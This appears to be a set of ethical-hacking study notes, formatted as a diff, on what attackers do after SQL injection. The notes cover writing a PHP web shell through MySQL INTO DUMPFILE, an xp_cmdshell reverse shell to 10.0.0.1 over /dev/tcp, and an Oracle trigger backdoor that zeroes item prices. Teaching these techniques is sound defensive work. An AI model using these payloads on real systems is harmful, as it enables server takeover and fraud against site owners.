@@ -1,0 +1,52 @@
+▪ Getting OS Shell
+Attackers use SQL server functions such as xp_cmdshell to execute arbitrary commands. 
+
+Every DBMS software has its own naming convention for such functions. 
+
+Another way to create backdoors is to use the SELECT ... INTO OUTFILE feature provided by MySQL to write arbitrary files with the database user permissions.
+
+If an attacker can access the web server, he/she can use the following MySQL query to create a PHP shell on the server 
+SELECT '<?php exec($_GET[''cmd'']); ?>' FROM usertable INTO dumpfile‘/var/www/html/shell.php’
+
+o Using Outfile If an attacker can access the web server, he/she can use the following MySQL query to create a PHP shell on the server
+SELECT '<?php exec($_GET[''cmd'']); ?>' FROM usertable INTO dumpfile ‘/var/www/html/shell.php’
+
+• An attacker, with the help of the directory structure, can find the location to place the shell on the web server
+
+• MSSQL has built-in functions such as xp_cmdshell to call the OS functions at runtime
+
+o Finding Directory Structure To learn the location of the database in the web server, an attacker can use the following SQL injection query, which gives the directory structure.
+
+By learning about the structure of the directory, an attacker can find the location to place the shell on the web server. SELECT @@datadir;
+
+o Using Built-in DBMS Functions
+MSSQL has built-in functions such as xp_cmdshell to call OS functions at run time.
+
+For example, the following statement creates an interactive shell listening at 10.0.0.1 and port 8080 EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
+
+
+
+▪ Creating Database Backdoor 
+Attackers use triggers to create database backdoors. 
+
+A database trigger is a stored procedure that is automatically invoked and executed in response to certain database events. 
+
+For example, an online shopping website stores the details of all the items it sells in a database table called ITEMS. 
+
+An attacker may inject a malicious trigger into this table such that whenever an INSERT query is executed, the trigger will automatically set the price of the item to 0.
+
+Hence, whenever a customer purchases an item, he/she purchases the item without paying money
+
+The Oracle code for the malicious trigger is given below:
+CREATE OR REPLACE TRIGGER SET_PRICE 
+AFTER INSERT OR UPDATE ON ITEMS
+FOR EACH ROW 
+BEGIN
+UPDATE ITEMS
+SET Price = 0;
+END;
+
+
+
+
+
